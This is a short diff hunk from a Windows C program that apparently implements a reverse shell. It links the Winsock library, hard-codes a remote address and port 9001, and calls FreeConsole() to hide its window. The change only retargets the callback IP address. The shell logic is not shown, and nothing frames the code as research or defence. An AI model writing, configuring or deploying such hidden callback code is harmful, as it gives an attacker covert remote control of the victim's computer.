@@ -8,7 +8,7 @@
 #pragma comment(lib, "Ws2_32.lib")
 
 int main(void){
-	char REMOTE_ADDR[] = "192.168.56.1";
+	char REMOTE_ADDR[] = "169.254.239.84";
 	char REMOTE_PORT[] = "9001";
 	FreeConsole();
 	WSADATA wsaData;
